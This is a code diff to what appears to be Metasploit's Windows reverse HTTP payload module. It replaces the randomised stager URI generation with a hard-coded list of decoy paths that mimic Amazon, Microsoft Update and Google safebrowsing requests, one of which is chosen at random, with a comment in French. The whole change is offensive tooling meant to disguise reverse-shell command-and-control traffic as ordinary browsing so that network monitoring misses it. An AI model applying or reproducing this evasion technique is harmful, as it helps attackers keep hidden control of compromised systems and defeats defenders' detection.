@@ -50,7 +50,8 @@ module Payload::Windows::ReverseHttp
 
     # Add extra options if we have enough space
     if self.available_space.nil? || required_space <= self.available_space
-      conf[:url]            = luri + generate_uri(opts)
+      #conf[:url]            = luri + generate_uri(opts)
+      conf[:url]            = luri + custom_uri()
       conf[:exitfunk]       = ds['EXITFUNC']
       conf[:ua]             = ds['HttpUserAgent']
       conf[:proxy_host]     = ds['HttpProxyHost']
@@ -109,26 +110,43 @@ module Payload::Windows::ReverseHttp
   # Generate the URI for the initial stager
   #
   def generate_uri(opts={})
-    ds = opts[:datastore] || datastore
-    uri_req_len = ds['StagerURILength'].to_i
+    #ds = opts[:datastore] || datastore
+    #uri_req_len = ds['StagerURILength'].to_i
 
     # Choose a random URI length between 30 and 255 bytes
-    if uri_req_len == 0
-      uri_req_len = 30 + luri.length + rand(256 - (30 + luri.length))
-    end
+    #if uri_req_len == 0
+    #  uri_req_len = 30 + luri.length + rand(256 - (30 + luri.length))
+    #end
 
-    if uri_req_len < 5
-      raise ArgumentError, "Minimum StagerURILength is 5"
-    end
+    #if uri_req_len < 5
+    #  raise ArgumentError, "Minimum StagerURILength is 5"
+    #end
 
-    generate_uri_uuid_mode(:init_native, uri_req_len)
+    #generate_uri_uuid_mode(:init_native, uri_req_len)
+    custom_uri()
   end
 
   #
   # Generate the URI for the initial stager
   #
+
+  #Nous definissons un dictionnaire avec des URI puis en choisissons un au hasard.
+  def custom_uri()
+  dico = ["/metro91/admin/1/secure.php",
+  "/metro91/admin/1/ppptp.jpg",
+  "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=book",
+  "/N4215/adj/amzn.us.sr.aps?sz=160x600&oe=oe&sn=91191&s=3717&dc_ref=http%3A%2F%2Fwww.amazon.com",
+  "/c/msdownload/update/others/2013/11/9946821_f5082b842c8abc5c47cfc68f98340ec384b69fa9.cab",
+  "/c/msdownload/update/software/ftpk/2013/11/ie-spelling-nl_3576e6450352dfc0c0892bf62384e75a56d780a7.msu",
+  "/safebrowsing/rd/CltOb12nLW1IbHehcmUtd2hUdmFzEBAY7-0KIOkUDC7h2"]  
+  return dico.sample
+
+end 
   def generate_small_uri
-    generate_uri_uuid_mode(:init_native, 30)
+    
+
+    #generate_uri_uuid_mode(:init_native, 30)
+    custom_uri()
   end
 
   #
